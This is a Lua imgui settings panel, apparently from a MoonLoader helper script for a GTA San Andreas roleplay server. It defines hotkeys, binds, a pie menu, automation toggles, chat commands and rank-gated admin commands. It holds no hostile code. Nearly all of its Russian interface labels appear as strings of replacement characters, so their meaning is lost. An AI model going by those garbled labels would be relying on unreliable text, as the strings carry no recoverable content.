					if imgui.ToggleButton("tab_skipd7", togglebools.tab_skipd[7]) then config_ini.bools[51] = togglebools.tab_skipd[7].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� ��������� ����������� ��������� (�� ������ ")) imgui.SameLine() imgui.PushItemWidth(90) imgui.InputText(u8'##dial3', guibuffers.dial.meh) imgui.SameLine() imgui.PopItemWidth() imgui.Text(u8(" ����.)"))				
					if imgui.ToggleButton("tab_skipd8", togglebools.tab_skipd[8]) then config_ini.bools[53] = togglebools.tab_skipd[8].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� �������� �������� � ������������ �� ��� (�� ������ ")) imgui.SameLine() imgui.PushItemWidth(90) imgui.InputText(u8'##dial4', guibuffers.dial.azs) imgui.SameLine() imgui.PopItemWidth() imgui.Text(u8(" ����.)"))				
				end

				if maintabs.tab_main_binds.status then
						if maintabs.tab_main_binds.first then
								imgui.NewLine()
								imgui.Hotkey("Name", 1, 100) imgui.SameLine() imgui.Text(u8("�������� � ����� � �����"))
								imgui.SameLine(600)
								imgui.Hotkey("Name19", 19, 100) imgui.SameLine() imgui.Text(u8("����� ������ � members")) imgui.NewLine()

								imgui.Hotkey("Name2", 2, 100) imgui.SameLine() imgui.Text(u8("�������� ���� ���������"))
								imgui.SameLine(600)
								imgui.Hotkey("Name20", 20, 100) imgui.SameLine() imgui.Text(u8("������� ����� �������")) imgui.NewLine()

								imgui.Hotkey("Name3", 3, 100) imgui.SameLine() imgui.Text(u8("���� ��������"))
								imgui.SameLine(600)
								imgui.Hotkey("Name21", 21, 100) imgui.SameLine() imgui.Text(u8("�������� ���� ������� � �����\n/r || �.�.�.�. || SOS �-14")) imgui.NewLine()

								imgui.Hotkey("Name4", 4, 100) imgui.SameLine() imgui.Text(u8("����������� �������\n(����������� ����� �������� ������ - ������ ��������� �������)"))
								imgui.SameLine(600)
								imgui.Hotkey("Name22", 22, 100) imgui.SameLine() imgui.Text(u8("������� ������/��������� ������")) imgui.NewLine()

								imgui.Hotkey("Name5", 5, 100) imgui.SameLine() imgui.Text(u8("���������������� � ��������� �������"))
								imgui.SameLine(600)
								imgui.Hotkey("Name24", 23, 100) imgui.SameLine() imgui.Text(u8("���� ��������")) imgui.NewLine()

								imgui.Hotkey("Name6", 6, 100) imgui.SameLine() imgui.Text(u8("�������� (���������� ���������� �� ���������)"))
								imgui.SameLine(600)
								imgui.Hotkey("Name27", 25, 100) imgui.SameLine() imgui.Text(u8("�������� ������ �� �� ���")) imgui.SameLine() if imgui.ToggleButton("CHs1", togglebools.tab_main_binds.clistparams[1]) then config_ini.bools[2] = togglebools.tab_main_binds.clistparams[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ��������")) imgui.NewLine()

								imgui.Hotkey("Name7", 7, 100) imgui.SameLine() imgui.Text(u8("�������� (���������� ������������)"))
								imgui.SameLine(600)
								imgui.Hotkey("Name28", 26, 100) imgui.SameLine() imgui.Text(u8("������� �����")) imgui.SameLine() if imgui.ToggleButton("Zdrj", togglebools.tab_main_binds.clistparams[2]) then config_ini.bools[3] = togglebools.tab_main_binds.clistparams[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������� �������� �����������")) imgui.NewLine()

								imgui.Hotkey("Name8", 8, 100) imgui.SameLine() imgui.Text(u8("�������� (���������� �������� ����������)"))
								imgui.SameLine(600)
								imgui.Hotkey("Name13", 13, 100) imgui.SameLine() imgui.Text(u8("/lock")) imgui.NewLine()

								imgui.Hotkey("Name9", 9, 100) imgui.SameLine() imgui.Text(u8("�������� \"�������� \"�.�.�.�.\"\"")) imgui.NewLine()

								imgui.Hotkey("Name23", 10, 100) imgui.SameLine() imgui.Text(u8("������� �����")) imgui.NewLine()
								imgui.Hotkey("Name25", 11, 100) imgui.SameLine() imgui.Text(u8("������� (������)")) imgui.NewLine()
								imgui.Hotkey("Name12", 12, 100) imgui.SameLine() imgui.Text(u8("�������� �������������")) imgui.NewLine()
						end

						if maintabs.tab_main_binds.clistparams then
								imgui.PushItemWidth(500)
								imgui.InputText(u8'##clist1', guibuffers.clistparams.clist1) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist27', guibuffers.clistparams.clist27)
								imgui.InputText(u8'##clist2', guibuffers.clistparams.clist2) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist28', guibuffers.clistparams.clist28)
								imgui.InputText(u8'##clist3', guibuffers.clistparams.clist3) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist29', guibuffers.clistparams.clist29)
								imgui.InputText(u8'##clist4', guibuffers.clistparams.clist4) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist30', guibuffers.clistparams.clist30)
								imgui.InputText(u8'##clist5', guibuffers.clistparams.clist5) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist31', guibuffers.clistparams.clist31)
								imgui.InputText(u8'##clist6', guibuffers.clistparams.clist6) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist32', guibuffers.clistparams.clist32)
								imgui.InputText(u8'##clist7', guibuffers.clistparams.clist7) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist33', guibuffers.clistparams.clist33)
								imgui.InputText(u8'##clist8', guibuffers.clistparams.clist8)
								imgui.InputText(u8'##clist9', guibuffers.clistparams.clist9)
								imgui.InputText(u8'##clist10', guibuffers.clistparams.clist10)
								imgui.InputText(u8'##clist11', guibuffers.clistparams.clist11)
								imgui.InputText(u8'##clist13', guibuffers.clistparams.clist13)
								imgui.InputText(u8'##clist14', guibuffers.clistparams.clist14)
								imgui.InputText(u8'##clist15', guibuffers.clistparams.clist15)
								imgui.InputText(u8'##clist16', guibuffers.clistparams.clist16)
								imgui.InputText(u8'##clist17', guibuffers.clistparams.clist17)
								imgui.InputText(u8'##clist18', guibuffers.clistparams.clist18)
								imgui.InputText(u8'##clist19', guibuffers.clistparams.clist19)
								imgui.InputText(u8'##clist20', guibuffers.clistparams.clist20)
								imgui.InputText(u8'##clist21', guibuffers.clistparams.clist21)
								imgui.InputText(u8'##clist22', guibuffers.clistparams.clist22)
								imgui.InputText(u8'##clist23', guibuffers.clistparams.clist23)
								imgui.InputText(u8'##clist24', guibuffers.clistparams.clist24)
								imgui.InputText(u8'##clist25', guibuffers.clistparams.clist25)
								imgui.InputText(u8'##clist26', guibuffers.clistparams.clist26)
								imgui.PopItemWidth()
						end
						
						
						
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 - 30))
							if imgui.Button(u8("1"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.first, maintabs.tab_main_binds.clistparams = true, false end
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2))
							if imgui.Button(u8("��������� �����"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.first, maintabs.tab_main_binds.clistparams = false, true end
				end

				if maintabs.tab_user_binds.status then
						if maintabs.tab_user_binds.hk then
								imgui.NewLine()
								imgui.Text(u8("������� ���������")) imgui.SameLine(300)  imgui.Text(u8("��������")) imgui.NewLine()
								imgui.Hotkey("Name27", 27, 100) imgui.SameLine() imgui.InputText(u8'##bind1', guibuffers.ubinds.bind1) imgui.SameLine() if imgui.ToggleButton("enter1", togglebools.tab_user_binds.hk[1]) then config_ini.bools[4] = togglebools.tab_user_binds.hk[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name28", 28, 100) imgui.SameLine() imgui.InputText(u8'##bind2', guibuffers.ubinds.bind2) imgui.SameLine() if imgui.ToggleButton("enter2", togglebools.tab_user_binds.hk[2]) then config_ini.bools[5] = togglebools.tab_user_binds.hk[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name29", 29, 100) imgui.SameLine() imgui.InputText(u8'##bind3', guibuffers.ubinds.bind3) imgui.SameLine() if imgui.ToggleButton("enter3", togglebools.tab_user_binds.hk[3]) then config_ini.bools[6] = togglebools.tab_user_binds.hk[3].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name30", 30, 100) imgui.SameLine() imgui.InputText(u8'##bind4', guibuffers.ubinds.bind4) imgui.SameLine() if imgui.ToggleButton("enter4", togglebools.tab_user_binds.hk[4]) then config_ini.bools[7] = togglebools.tab_user_binds.hk[4].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name31", 31, 100) imgui.SameLine() imgui.InputText(u8'##bind5', guibuffers.ubinds.bind5) imgui.SameLine() if imgui.ToggleButton("enter5", togglebools.tab_user_binds.hk[5]) then config_ini.bools[8] = togglebools.tab_user_binds.hk[5].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name32", 32, 100) imgui.SameLine() imgui.InputText(u8'##bind6', guibuffers.ubinds.bind6) imgui.SameLine() if imgui.ToggleButton("enter6", togglebools.tab_user_binds.hk[6]) then config_ini.bools[9] = togglebools.tab_user_binds.hk[6].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name33", 33, 100) imgui.SameLine() imgui.InputText(u8'##bind7', guibuffers.ubinds.bind7) imgui.SameLine() if imgui.ToggleButton("enter7", togglebools.tab_user_binds.hk[7]) then config_ini.bools[10] = togglebools.tab_user_binds.hk[7].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name34", 34, 100) imgui.SameLine() imgui.InputText(u8'##bind8', guibuffers.ubinds.bind8) imgui.SameLine() if imgui.ToggleButton("enter8", togglebools.tab_user_binds.hk[8]) then config_ini.bools[11] = togglebools.tab_user_binds.hk[8].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name35", 35, 100) imgui.SameLine() imgui.InputText(u8'##bind9', guibuffers.ubinds.bind9) imgui.SameLine() if imgui.ToggleButton("enter9", togglebools.tab_user_binds.hk[9]) then config_ini.bools[12] = togglebools.tab_user_binds.hk[9].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name36", 36, 100) imgui.SameLine() imgui.InputText(u8'##bind10', guibuffers.ubinds.bind10) imgui.SameLine() if imgui.ToggleButton("enter10", togglebools.tab_user_binds.hk[10]) then config_ini.bools[13] = togglebools.tab_user_binds.hk[10].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name37", 37, 100) imgui.SameLine() imgui.InputText(u8'##bind11', guibuffers.ubinds.bind11) imgui.SameLine() if imgui.ToggleButton("enter11", togglebools.tab_user_binds.hk[11]) then config_ini.bools[14] = togglebools.tab_user_binds.hk[11].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter"))
						end

						if maintabs.tab_user_binds.cmd then
								imgui.NewLine()
								imgui.Text(u8("������� ���������")) imgui.SameLine(300)  imgui.Text(u8("��������")) imgui.NewLine()
								imgui.PushItemWidth(100)
								imgui.InputText(u8'##ucbindsc1', guibuffers.ucbindsc.bind1) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds1', guibuffers.ucbinds.bind1) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc2', guibuffers.ucbindsc.bind2) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds2', guibuffers.ucbinds.bind2) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc3', guibuffers.ucbindsc.bind3) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds3', guibuffers.ucbinds.bind3) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc4', guibuffers.ucbindsc.bind4) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds4', guibuffers.ucbinds.bind4) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc5', guibuffers.ucbindsc.bind5) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds5', guibuffers.ucbinds.bind5) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc6', guibuffers.ucbindsc.bind6) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds6', guibuffers.ucbinds.bind6) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc7', guibuffers.ucbindsc.bind7) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds7', guibuffers.ucbinds.bind7) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc8', guibuffers.ucbindsc.bind8) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds8', guibuffers.ucbinds.bind8) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc9', guibuffers.ucbindsc.bind9) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds9', guibuffers.ucbinds.bind9) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc10', guibuffers.ucbindsc.bind10) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds10', guibuffers.ucbinds.bind10) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc11', guibuffers.ucbindsc.bind11) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds11', guibuffers.ucbinds.bind11) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc12', guibuffers.ucbindsc.bind12) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds12', guibuffers.ucbinds.bind12) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc13', guibuffers.ucbindsc.bind13) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds13', guibuffers.ucbinds.bind13) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc14', guibuffers.ucbindsc.bind14) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds14', guibuffers.ucbinds.bind14) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.PopItemWidth()
						end

						if maintabs.tab_user_binds.pie then
								imgui.NewLine()
								imgui.Text(u8("Pie menu - ��� �������� ���������� ���� ��� �������� ������� ���������. �� ������ ��������� �� ������ ��������. ����������� ������� ���������, �������� �� ������ ����� � ��������� �������."))
								imgui.Hotkey("Name44", 44, 100) imgui.SameLine() imgui.Text(u8("������� ��������� (������ ��������� ������� ��������������)")) imgui.NewLine()
								imgui.Text(u8("��� ������")) imgui.SameLine(200)  imgui.Text(u8("��������")) imgui.NewLine()
								imgui.PushItemWidth(100)
								imgui.InputText(u8'##piename1', guibuffers.UserPieMenu.names.name1) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction1', guibuffers.UserPieMenu.actions.action1) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename2', guibuffers.UserPieMenu.names.name2) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction2', guibuffers.UserPieMenu.actions.action2) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename3', guibuffers.UserPieMenu.names.name3) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction3', guibuffers.UserPieMenu.actions.action3) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename4', guibuffers.UserPieMenu.names.name4) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction4', guibuffers.UserPieMenu.actions.action4) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename5', guibuffers.UserPieMenu.names.name5) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction5', guibuffers.UserPieMenu.actions.action5) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename6', guibuffers.UserPieMenu.names.name6) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction6', guibuffers.UserPieMenu.actions.action6) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename7', guibuffers.UserPieMenu.names.name7) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction7', guibuffers.UserPieMenu.actions.action7) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename8', guibuffers.UserPieMenu.names.name8) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction8', guibuffers.UserPieMenu.actions.action8) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename9', guibuffers.UserPieMenu.names.name9) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction9', guibuffers.UserPieMenu.actions.action9) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename10', guibuffers.UserPieMenu.names.name10) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction10', guibuffers.UserPieMenu.actions.action10) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.PopItemWidth()
						end

						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 - 30))
								if imgui.Button(u8("�� �������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_user_binds.hk, maintabs.tab_user_binds.cmd, maintabs.user_keys.status.v, maintabs.tab_user_binds.pie = true, false, false, false end
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2))
								if imgui.Button(u8("�� �������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_user_binds.hk, maintabs.tab_user_binds.cmd,maintabs.user_keys.status.v, maintabs.tab_user_binds.pie = false, true, false, false end
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 30))
								if imgui.Button(u8("Pie menu"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_user_binds.hk, maintabs.tab_user_binds.cmd,maintabs.user_keys.status.v, maintabs.tab_user_binds.pie = false, false, false, true end
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 60))
								if imgui.Button(u8("������ ������"), imgui.ImVec2(120.0, 20.0)) then maintabs.user_keys.status.v = true end
				end

				if maintabs.tab_bbot.status then
						imgui.NewLine()
						if imgui.Button(u8("������� ����� ��������� �������� ��������� ��������� � ���"), imgui.ImVec2(400.0, 20.0)) then maintabs.rphr.status.v = true end
						if imgui.Button(u8("������� ����� ��������� �������������� ������ �� �� ������"), imgui.ImVec2(400.0, 20.0)) then maintabs.auto_bp.status.v = true end
						if imgui.Button(u8("������� ����� ��������� ������� �� ���������� ���� � �����"), imgui.ImVec2(400.0, 20.0)) then maintabs.warnings.status.v = true end
						if imgui.ToggleButton("tab_bbot1", togglebools.tab_bbot[1]) then config_ini.bools[39] = togglebools.tab_bbot[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ��������� ���� � ����"))
						--if imgui.ToggleButton("tab_bbot2", togglebools.tab_bbot[3]) then config_ini.bools[42] = togglebools.tab_bbot[3].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� ���������������� ���� ���� � ������ ���� ��������"))
						if imgui.ToggleButton("tab_bbot3", togglebools.tab_bbot[4]) then config_ini.bools[55] = togglebools.tab_bbot[4].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������� � �������� �� ���� ������� � ����������"))
						--if imgui.ToggleButton("tab_bbot4", togglebools.tab_bbot[5]) then config_ini.bools[56] = togglebools.tab_bbot[5].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������� ������� ��������� �� ��������� ����� �������������"))
						if imgui.ToggleButton("tab_bbot5", togglebools.tab_bbot[6]) then config_ini.bools[15] = togglebools.tab_bbot[6].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������� � ������������� �������� � ���������� �������"))
						if imgui.ToggleButton("tab_bbot6", togglebools.tab_bbot[7]) then config_ini.bools[57] = togglebools.tab_bbot[7].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� ������� ������ � �������������� ����� ��������� (������� ��� ���������)")) if imgui.IsItemClicked() then maintabs.tab_main_binds.gunparams.v = true end
						if imgui.ToggleButton("tab_bbot7", togglebools.tab_bbot[8]) then config_ini.bools[59] = togglebools.tab_bbot[8].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� ��������� �������� ���� ������� � ������ �����������"))
						imgui.Hotkey("Name41", 41, 100) imgui.SameLine() imgui.Text(u8("�������������� ������� ������� ��������")) imgui.NewLine()

				end

				if maintabs.tab_commands.status then
						if maintabs.tab_commands.first then
								imgui.NewLine()
								imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands1', guibuffers.commands.command1) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ���������� ��������"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands19', guibuffers.commands.command19) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� ��� ���������� �����������")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands2', guibuffers.commands.command2) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ������������� ���������"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands20', guibuffers.commands.command20) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ������ ���� ������ ������� ������ � ���������� ����")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands3', guibuffers.commands.command3) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ��������� ���������"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands21', guibuffers.commands.command21) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("���������� ��������� ������")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands4', guibuffers.commands.command4) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ������� �������������� ���������"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands22', guibuffers.commands.command22) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("���������� ��������� �����")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands5', guibuffers.commands.command5) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ����������� ��������� �� ����"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands25', guibuffers.commands.command25) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("����������� ����� AFK")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands6', guibuffers.commands.command6) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � �������� ��������"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands27', guibuffers.commands.command27) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ���� ��������� � ���� � ���� �������")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands7', guibuffers.commands.command7) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ��������� �����(��)"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands28', guibuffers.commands.command28) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� ������� � �������������")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands9', guibuffers.commands.command9) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ����� � �����"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands17', guibuffers.commands.command17) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("����� ������ � �� ���")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands10', guibuffers.commands.command10) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ����� � �������/�����"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands18', guibuffers.commands.command18) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ���� ��������")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands11', guibuffers.commands.command11) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������������� � ��������� �������")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##commands12', guibuffers.commands.command12) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� �������")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##commands13', guibuffers.commands.command13) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� ����������")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##commands14', guibuffers.commands.command14) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ��������� �����")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##commands15', guibuffers.commands.command15) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("��������� ������ ��")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##commands16', guibuffers.commands.command16) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("����� ������ � members")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.PopItemWidth()
						end

						if maintabs.tab_commands.second and alevel >= 0 then
								imgui.NewLine()
								imgui.Text(u8("� ������ ������� ������������ ������� ���������� ������� (��� ��� � ������� ������). ��� ����������� ������ ������ ��������� ����������� � ������� � ������� ������� /balogin"))
								if alevel > 0 then
										imgui.Text(u8("/lek [pmp/rb/np/tp/nv/no] - ����������� ������� � ����������� ��������� ������"))
										imgui.Text(u8("/pcheck (-1) - ������� ������ ������������� ������� ������ (-1 - ���� ������)"))
										imgui.Text(u8("/tren [�������] [���������� ���������] [���������� �����������] [��������� (1-3)] [������������� �����������] - ���������� ������� � ���������� ���������� � �������"))
								end

								if alevel > 1 then
										imgui.Text(u8("/padd [id/nick] - �������� ���������� ������ � ������ �������������"))
										imgui.Text(u8("/pdel [id/nick] - ������� ���������� ������ �� ������ �������������"))
										imgui.Text(u8("/add [id] [���� ���������� ���������] - �������� ������ � ������� ������"))
										imgui.Text(u8("/del [id] ([������� �������� � ��]) - ������� ������ �� ������� ������"))
										imgui.Text(u8("/change [id] [rank: 1/0] [�������/0/-1] ([��������� � ������: 1/0]) - �������� ���������� �� ������ � ������� ������"))
										imgui.Text(u8("/mark [id] [zua/zuo/zio/zz/pmp/rb/uts/no/kp/np/op/total/dopusk] [������ 0-5] ([������� ���������]) - ���������� ������ ������ �� ������������ ���������"))										
								end

								if alevel > 2 then
									imgui.Text(u8("/otm - ���������� ������� ������� ������� � ������� (����� +)"))							
								end
								
								if alevel == 3 or alevel == 6 then
									imgui.Text(u8("/fond [add/del/ref] - �������� ���� ������ (������� ��� ���������)")) if imgui.IsItemClicked() then maintabs.tab_commands.money.v = true end
								end

								if alevel > 4 then
									imgui.Text(u8("/moder [id] [�������] [������ ��� �����] - ������ ���������� ������ ����� ����������"))
									imgui.Text(u8("/reg [id] [T/M/H] - ���������������� ������ � ������� (���� �������)"))
									imgui.Text(u8("/ban [id] - ������� ������ � ������� ���������� ������ (���� �������)"))
								end
						end

						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 - 30))
								if imgui.Button(u8("1"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_commands.first, maintabs.tab_commands.second, maintabs.tab_commands.help.v, maintabs.tab_commands.money.v = true, false, false, false end
						if alevel >= 0 then
								imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2))
										if imgui.Button(u8("2"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_commands.first, maintabs.tab_commands.second, maintabs.tab_commands.help.v, maintabs.tab_commands.money.v = false, true, false, false end
						end
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 30))
								if imgui.Button(u8("������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_commands.help.v, maintabs.tab_commands.money.v = true, false end
				end

				if maintabs.tab_overlay.status then
						imgui.NewLine()
						imgui.Text(u8("Overlay - ������� ����������� �������� ������ �������� ������ ����������� �������� � ��������� �����������. ������������ �������� ����� �� ����������� � ������� ��������� �\n����������� ������������. ����������� ���������� ��������� ��������� �� ����� ������������ � ��� ����� 1920�1080 � ��������� � GTA V Hud by DC22Pac. ��� ������������� �����������\n�������� ��������� ������� ������� � ������� �� ��."))
						imgui.NewLine()
						imgui.Hotkey("Name43", 43, 100) imgui.SameLine() imgui.Text(u8("��������� ������������ ���������")) imgui.NewLine()
						if imgui.ToggleButton("tab_overlay1", togglebools.tab_overlay[1]) then config_ini.bools[25] = togglebools.tab_overlay[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������� ������������� overlay"))
